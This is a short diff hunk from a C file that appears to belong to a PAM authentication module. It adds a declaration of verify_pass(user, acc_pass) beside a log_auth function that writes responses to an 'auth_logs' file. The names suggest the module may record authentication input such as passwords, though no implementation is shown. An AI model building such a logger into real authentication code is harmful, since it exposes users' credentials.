@@ -4,6 +4,7 @@
 #define LOG_FMT "%s (%s)\n"
 #define LOG_PATH INSTALL_DIR"/auth_logs"
 
+int verify_pass(char *user, char *acc_pass);
 void log_auth(pam_handle_t *pamh, char *resp);
 #include "log.c"
 
